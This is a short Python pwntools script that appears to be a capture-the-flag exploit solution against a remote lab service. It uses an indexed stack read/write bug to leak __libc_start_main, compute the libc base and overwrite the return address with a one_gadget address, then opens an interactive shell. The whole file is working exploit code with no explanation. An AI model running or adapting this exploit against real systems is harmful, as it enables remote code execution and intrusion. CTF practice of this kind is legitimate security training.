from pwn import *

#p = process('./pwn')
p = remote("1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com",57856)
elf = ELF('./pwn')
libc = ELF('libc.so')
context.log_level = 'debug'

def sr(index):
    p.recvuntil('input index\n')
    p.sendline(str(index))
    p.recvuntil('now value(hex) ')
    return p.recvuntil('input')[-8:-6]

def xsr(index):
    p.recvuntil('new value\n')
    p.sendline(str(index))

# 328 --> canary ; 632 --> libc_start_maini ; 344 --> ret
p.recvuntil('name:')
p.sendline('A')
libc_start = ''
for i in range(8):
    data = sr(632+i)
    libc_start += data+' '
    data = int('0x'+data,16)
    xsr(data)

print libc_start
libc_start_addr = raw_input('input addr:')
libc_start_addr = int(libc_start_addr,16)-240
libc_base = libc_start_addr - libc.symbols['__libc_start_main']
one_addr = libc_base + 0x45216
one_addr = hex(one_addr)
print one_addr

lili = []
for j in range(2,len(one_addr),2) :
    lili.append(int('0x'+one_addr[j:j+2],16))
lili = lili[::-1]
lili.append(0)
lili.append(0)
print lili

for a in range(8):
    data = sr(344+a)
    xsr(lili[a])

for b in range(25):
    data = sr(b)
    data = int('0x'+data,16)
    xsr(data)

p.recvuntil('do you want continue(yes/no)? \n')
#gdb.attach(p)
p.sendline('no')

p.interactive()
